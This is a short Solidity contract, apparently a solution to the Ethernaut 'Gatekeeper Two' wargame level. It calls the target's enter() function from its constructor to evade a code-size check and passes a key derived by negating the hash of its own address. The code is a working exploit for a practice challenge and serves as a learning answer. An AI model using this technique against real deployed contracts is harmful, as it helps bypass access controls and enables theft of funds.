// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoHack {
    IGatekeeperTwo public gatekeeperTwo = IGatekeeperTwo(0x299dE0B10B32E07646D4B115A3408C863832fC8d);

    constructor() public {
        gatekeeperTwo.enter(~bytes8(keccak256(abi.encodePacked(address(this)))));
    }
}
